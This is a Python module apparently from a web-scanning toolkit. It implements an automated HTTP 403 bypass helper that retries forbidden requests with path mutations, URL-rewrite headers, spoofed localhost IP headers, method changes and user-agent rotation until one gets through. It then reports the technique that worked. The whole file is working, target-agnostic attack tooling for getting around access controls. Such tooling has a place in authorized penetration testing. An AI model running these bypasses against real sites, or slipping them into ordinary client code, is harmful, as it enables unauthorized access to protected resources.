#!/usr/bin/env python3
"""
Universal HTTP 403 Bypass Helper

Goal: Provide target-agnostic request retries that systematically attempt
common, cross-platform 403 bypass techniques without hardcoding app logic.
"""

from __future__ import annotations

import asyncio
import logging
from typing import Dict, Optional, Tuple, Any, List
from urllib.parse import urlparse, urlunparse

import aiohttp

logger = logging.getLogger(__name__)


class SmartRequester:
    def __init__(self, session: aiohttp.ClientSession, default_timeout: float = 20.0):
        self.session = session
        self.default_timeout = default_timeout

    async def request(self,
                      method: str,
                      url: str,
                      *,
                      headers: Optional[Dict[str, str]] = None,
                      data: Any = None,
                      params: Optional[Dict[str, str]] = None,
                      allow_redirects: bool = True,
                      timeout: Optional[float] = None,
                      max_attempts: int = 12) -> Tuple[aiohttp.ClientResponse, str, Optional[str]]:
        """Send a request with universal 403-bypass retries.

        Returns (response, text, bypass_method). Attempts variants if 403 is encountered.
        bypass_method is None if original request succeeded, otherwise describes the technique used.
        """
        headers = dict(headers or {})
        timeout_obj = aiohttp.ClientTimeout(total=timeout or self.default_timeout)

        # First attempt: as-is
        try:
            async with self.session.request(method, url, headers=headers, data=data, params=params,
                                            allow_redirects=allow_redirects, timeout=timeout_obj) as r:
                t = await r.text()
                if r.status != 403:
                    return r, t, None  # No bypass needed
                base_text = t
                base_status = r.status
        except Exception as e:
            logger.debug(f"Initial request error: {e}")
            base_text = ''
            base_status = -1

        # Prepare variants
        parsed = urlparse(url)
        path = parsed.path or '/'
        qs = parsed.query
        path_variants = self._path_variants(path)

        header_variants = self._header_variants(headers, parsed)
        method_variants = [method]
        if method.upper() == 'GET':
            method_variants += ['POST', 'HEAD']  # Some WAFs gate by method
        else:
            method_variants += ['GET', 'HEAD']

        ua_variants = self._ua_variants(headers)

        attempts: List[Tuple[str, Dict[str, str], str]] = []
        for pv in path_variants:
            new_url = urlunparse(parsed._replace(path=pv))
            attempts.append((new_url, headers, method))

        # Header-based attempts on original path first
        for hv in header_variants:
            attempts.append((url, hv, method))

        # Mix method changes on original URL
        for mv in method_variants:
            attempts.append((url, headers, mv))

        # UA/Referer tweaks
        for hv in ua_variants:
            attempts.append((url, hv, method))

        # Combine: header + path variant (limited to avoid explosion)
        for hv in header_variants[:4]:
            for pv in path_variants[:4]:
                new_url = urlunparse(parsed._replace(path=pv))
                attempts.append((new_url, hv, method))

        seen = set()
        successes = []
        bypass_method = None

        for i, (u2, h2, m2) in enumerate(attempts):
            if len(successes) >= 1:
                break
            if i >= max_attempts:
                break
            key = (u2, tuple(sorted(h2.items())), m2)
            if key in seen:
                continue
            seen.add(key)
            
            # Determine bypass type for this attempt
            method_desc = self._describe_bypass_method(url, u2, headers, h2, method, m2)
            
            try:
                async with self.session.request(m2, u2, headers=h2, data=data, params=params,
                                                allow_redirects=allow_redirects, timeout=timeout_obj) as r2:
                    t2 = await r2.text()
                    logger.debug(f"403-bypass attempt[{i}] {m2} {u2} -> {r2.status}")
                    if r2.status not in (401, 403):
                        successes.append((r2, t2))
                        bypass_method = method_desc
                        break
            except Exception as e:
                logger.debug(f"403-bypass attempt error: {e}")
                continue

        if successes:
            return successes[0][0], successes[0][1], bypass_method

        # Nothing worked; return baseline result-like
        class _Dummy:
            status = base_status
            headers = {}
            url = url

        return _Dummy(), base_text, None

    def _describe_bypass_method(self, orig_url: str, test_url: str, orig_headers: Dict[str, str], test_headers: Dict[str, str], orig_method: str, test_method: str) -> str:
        """Describe which bypass technique was used"""
        techniques = []
        
        # Path variations
        if test_url != orig_url:
            orig_path = urlparse(orig_url).path
            test_path = urlparse(test_url).path
            if test_path.endswith('/.'):
                techniques.append("path_dot_suffix")
            elif test_path.endswith('./'):
                techniques.append("path_dot_slash")
            elif '%2e' in test_path:
                techniques.append("path_url_encoding")
            elif test_path.endswith(';/'):
                techniques.append("path_semicolon")
            elif test_path.startswith('//'):
                techniques.append("double_slash_prefix")
            else:
                techniques.append("path_variation")
        
        # Header variations
        if 'X-Original-URL' in test_headers and 'X-Original-URL' not in orig_headers:
            techniques.append("x_original_url_header")
        elif 'X-Rewrite-URL' in test_headers and 'X-Rewrite-URL' not in orig_headers:
            techniques.append("x_rewrite_url_header")
        elif 'X-Forwarded-For' in test_headers and 'X-Forwarded-For' not in orig_headers:
            techniques.append("ip_spoofing_headers")
        elif 'X-Forwarded-Host' in test_headers and 'X-Forwarded-Host' not in orig_headers:
            techniques.append("forwarded_host_header")
        elif test_headers.get('User-Agent') != orig_headers.get('User-Agent'):
            techniques.append("user_agent_variation")
        
        # Method variations
        if test_method != orig_method:
            techniques.append(f"method_change_{orig_method}_to_{test_method}")
        
        return '+'.join(techniques) if techniques else "unknown_bypass"

    def _path_variants(self, path: str) -> List[str]:
        """Generate cross-platform path variants commonly used to bypass 403s."""
        if not path:
            path = '/'
        if not path.startswith('/'):
            path = '/' + path
        variants = list(dict.fromkeys([
            path,
            path + '/',
            path + '/.',
            path + './',
            path + '%2e/',
            path + '/%2e',
            path + ';/',
            path + '/;/',
            '//' + path.lstrip('/'),
            '/.' + path,
            path + '?',
            path + '??',
        ]))
        return variants

    def _header_variants(self, base_headers: Dict[str, str], parsed) -> List[Dict[str, str]]:
        h0 = {k: v for k, v in (base_headers or {}).items()}
        host = parsed.netloc.split(':')[0]
        common = [
            {
                **h0,
                'X-Original-URL': parsed.path or '/',
            },
            {
                **h0,
                'X-Rewrite-URL': parsed.path or '/',
            },
            {
                **h0,
                'X-Custom-IP-Authorization': '127.0.0.1',
                'X-Forwarded-For': '127.0.0.1',
                'X-Real-IP': '127.0.0.1',
            },
            {
                **h0,
                'X-Forwarded-Host': host,
                'X-Forwarded-Proto': 'http',
                'Forwarded': f'for=127.0.0.1;host={host};proto=http',
            },
            {
                **h0,
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
            },
        ]
        # Remove duplicates
        uniq: List[Dict[str, str]] = []
        seen = set()
        for h in common:
            key = tuple(sorted(h.items()))
            if key not in seen:
                uniq.append(h)
                seen.add(key)
        return uniq

    def _ua_variants(self, base_headers: Dict[str, str]) -> List[Dict[str, str]]:
        h0 = {k: v for k, v in (base_headers or {}).items()}
        ua_list = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16 Safari/605.1.15',
            'curl/8.1.2',
        ]
        variants = []
        for ua in ua_list:
            h = {**h0, 'User-Agent': ua}
            variants.append(h)
        return variants


async def smart_request(session: aiohttp.ClientSession, method: str, url: str, **kwargs):
    """Convenience function using SmartRequester."""
    sr = SmartRequester(session)
    return await sr.request(method, url, **kwargs)

